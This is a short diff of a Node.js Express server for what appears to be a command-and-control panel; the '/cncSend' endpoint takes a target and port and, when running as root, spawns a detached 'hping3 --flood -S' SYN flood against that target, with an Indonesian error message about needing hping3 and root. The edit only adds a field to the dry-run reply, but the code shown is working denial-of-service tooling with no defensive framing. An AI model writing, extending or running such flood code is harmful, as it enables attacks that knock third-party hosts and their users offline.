@@ -731,7 +731,7 @@ app.get("/cncSend", auth, (req, res) => {
   const dry = req.query.dry === "1";
   if (!target) return res.json({ valid: false, message: "missing target" });
   const cap = { hping3: hasHping(), root: isRoot() };
-  if (dry) return res.json({ valid: true, dry: true, cap });
+  if (dry) return res.json({ valid: true, dry: true, sended: false, cap });
   if (!cap.hping3 || !cap.root) return res.json({ valid: false, sended: false, message: "VPS belum siap (butuh hping3+root).", cap });
   try {
     const p = spawn("hping3", ["--flood", "-S", target, "-p", String(port)], { detached: true, stdio: "ignore" });
